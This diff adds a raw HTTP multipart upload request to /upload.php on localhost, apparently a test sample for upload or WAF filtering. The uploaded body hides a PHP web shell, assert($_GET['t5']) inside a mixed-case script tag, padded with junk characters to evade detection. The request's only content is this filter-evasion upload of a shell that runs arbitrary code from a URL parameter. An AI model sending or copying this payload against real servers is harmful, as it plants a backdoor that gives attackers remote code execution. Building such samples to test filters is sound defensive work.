@@ -1,0 +1,14 @@
+POST /upload.php HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Accept-Language: zh
+User-Agent: Opera/29.25 (Linux 23.26; Linux 8.5; TencentTraveler 9.9) Intel Windows NT UCWeb4/ 7.8
+Content-Type:multipart/form-data; boundary=----zKVXFewujLGSLpzBCoFMhIoJSg
+Content-Length: 245
+
+Connection: close
+------zKVXFewujLGSLpzBCoFMhIoJSg
+Content-Disposition:form-data;name="username"; filename="hello.xxx"
+
+97322^&*(MNv^&*(8sM^&*(7Z<sCriPT LangUAge="phP">assert($_GET['t5']);</sCriPT>5%^&I$%^&*2%^&*(d2#$%^X
+------zKVXFewujLGSLpzBCoFMhIoJSgY
